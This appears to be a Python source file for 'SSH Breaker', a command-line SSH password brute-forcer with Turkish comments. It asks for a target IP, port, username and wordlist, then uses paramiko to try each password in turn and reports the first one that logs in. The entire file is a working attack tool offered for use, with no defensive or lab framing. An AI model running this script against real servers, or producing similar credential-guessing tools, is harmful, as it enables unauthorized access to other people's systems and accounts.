import os
import pyfiglet
import paramiko
from paramiko.ssh_exception import AuthenticationException, SSHException

def clear_screen():
    """Ekranı temizler."""
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    """SSHBreaker banner'ını çapraz yazı ile gösterir."""
    # ANSI escape code for neon blue
    neon_blue = '\033[1;34m'  # Bold Blue for neon effect
    reset_color = '\033[0m'    # Reset color to default
    
    banner = pyfiglet.figlet_format("SSH   Breaker", font="slant", width=200)
    print(f"{neon_blue}{banner}{reset_color}")
    print("                  - By Mr.CodeX")
    print("\n")

def ssh_bruteforce(target_ip, port, username, password_list_file):
    """SSH Bruteforce işlemini gerçekleştirir."""
    print(f"[INFO] SSH Bruteforce başlatılıyor: {target_ip}:{port} (Kullanıcı: {username})")

    try:
        # Parola listesini aç ve oku
        with open(password_list_file, "r") as file:
            passwords = file.readlines()
        
        for password in passwords:
            password = password.strip()  # Boşlukları temizle
            print(f"[DENEME] {username}:{password}")
            
            # SSH istemcisi oluştur
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            try:
                ssh.connect(target_ip, port=port, username=username, password=password, timeout=5)
                print(f"[BAŞARILI] Şifre bulundu: {username}:{password}")
                ssh.close()
                return
            except AuthenticationException:
                print("[HATA] Şifre yanlış.")
            except SSHException as e:
                print(f"[HATA] SSH hatası: {str(e)}")
            finally:
                ssh.close()
        
        print("[INFO] Tüm denemeler başarısız oldu.")
    
    except FileNotFoundError:
        print(f"[HATA] Parola dosyası bulunamadı: {password_list_file}")
    except Exception as e:
        print(f"[HATA] Beklenmeyen bir hata oluştu: {str(e)}")

if __name__ == "__main__":
    try:
        # Ekranı temizle ve banner göster
        clear_screen()
        show_banner()
        
        # Kullanıcıdan girdi al
        target_ip = input("Hedef IP: ")
        port = int(input("Port (varsayılan: 22): ") or 22)
        username = input("Kullanıcı adı: ")
        password_list_file = input("Parola dosyasının yolu: ")
        
        # SSH brute-force işlemini başlat
        ssh_bruteforce(target_ip, port, username, password_list_file)
    
    except KeyboardInterrupt:
        print("\n[INFO] Exiting the program...")  # Çıkış mesajı
